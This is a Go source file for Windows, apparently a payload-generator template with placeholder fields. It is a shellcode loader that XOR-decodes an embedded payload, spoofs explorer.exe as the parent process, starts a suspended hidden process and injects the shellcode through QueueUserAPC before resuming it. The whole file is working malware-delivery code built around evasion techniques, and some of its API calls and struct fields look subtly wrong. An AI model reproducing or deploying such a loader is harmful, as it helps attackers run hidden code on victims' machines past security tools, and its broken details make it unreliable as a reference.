// +build windows,amd64,!cgo
package main

import (
	"encoding/base64"
	"errors"
	"log"
	"strings"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

var (
	key = "§key§"
)

// --- Configurable section ---
const (
	pprocName  = "§explorer.exe§"              // PPID spoof target
	targetPath = "§c:\\windows\\explorer.exe§"  // Hollowing target
	shellcodeB64 = "§shellcode§"
)

func bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	baked := make([]byte, len(tmp))
	for i := range tmp {
		baked[i] = tmp[i] ^ _key[i%len(_key)]
	}
	return string(baked)
}

func polish(cipher string) []byte {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	polished := make([]byte, len(tmp))
	for i := range tmp {
		polished[i] = tmp[i] ^ _key[i%len(_key)]
	}
	return polished
}

// --- Windows process utils ---
type windowsProcess struct {
	ProcessID int
	Exe       string
}

func enumProcesses() []windowsProcess {
	hSnap, _ := syscall.CreateToolhelp32Snapshot(0x2, 0)
	defer syscall.CloseHandle(hSnap)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	procs := []windowsProcess{}
	if err := syscall.Process32First(hSnap, &entry); err != nil {
		return procs
	}
	for {
		exe := syscall.UTF16ToString(entry.ExeFile[:])
		procs = append(procs, windowsProcess{int(entry.ProcessID), exe})
		if err := syscall.Process32Next(hSnap, &entry); err != nil {
			break
		}
	}
	return procs
}

func findPPID(name string) int {
	procs := enumProcesses()
	for _, p := range procs {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return p.ProcessID
		}
	}
	return 0
}

func injectViaAPC(shellcode []byte, pid uint32) error {
	var hProc windows.Handle
	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hProc)

	addr, err := windows.VirtualAllocEx(hProc, 0, uintptr(len(shellcode)), 0x3000, 0x40)
	if err != nil {
		return err
	}

	var written uintptr
	err = windows.WriteProcessMemory(hProc, addr, &shellcode[0], uintptr(len(shellcode)), &written)
	if err != nil {
		return err
	}

	hThreadSnap, _ := syscall.CreateToolhelp32Snapshot(0x00000004, pid)
	defer syscall.CloseHandle(hThreadSnap)

	var threadEntry syscall.ThreadEntry32
	threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
	if syscall.Thread32First(hThreadSnap, &threadEntry) != nil {
		return errors.New("[-] Thread enumeration failed")
	}

	for {
		if threadEntry.OwnerProcessID == pid {
			hThread, err := windows.OpenThread(0x0010|0x0020, false, threadEntry.ThreadID)
			if err == nil {
				windows.QueueUserAPC(addr, hThread, 0)
				windows.CloseHandle(hThread)
				return nil
			}
		}
		if syscall.Thread32Next(hThreadSnap, &threadEntry) != nil {
			break
		}
	}
	return errors.New("[-] No suitable thread found")
}

func main() {
	sc := polish(shellcodeB64)
	pid := findPPID(pprocName)
	if pid == 0 {
		log.Fatal("[-] PPID not found")
	}

	// Create suspended process
	var si windows.StartupInfoEx
	var pi windows.ProcessInformation
	attrListLen := uintptr(0)
	windows.InitializeProcThreadAttributeList(nil, 1, 0, &attrListLen)
	attrList := make([]byte, attrListLen)
	si.ProcThreadAttributeList = &attrList[0]
	windows.InitializeProcThreadAttributeList(si.ProcThreadAttributeList, 1, 0, &attrListLen)

	hParent, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(pid))
	windows.UpdateProcThreadAttribute(si.ProcThreadAttributeList, 0, 0x00020000, uintptr(hParent), unsafe.Sizeof(hParent), 0, nil)

	si.Cb = uint32(unsafe.Sizeof(si))
	creationFlags := uint32(windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT | windows.CREATE_NO_WINDOW)
	target, _ := windows.UTF16PtrFromString(targetPath)
	err := windows.CreateProcess(nil, target, nil, nil, false, creationFlags, nil, nil, &si.StartupInfo, &pi)
	if err != nil {
		log.Fatal(err)
	}

	// Inject into new process
	err = injectViaAPC(sc, pi.ProcessId)
	if err != nil {
		log.Fatal(err)
	}

	// Resume main thread
	windows.ResumeThread(pi.Thread)
}
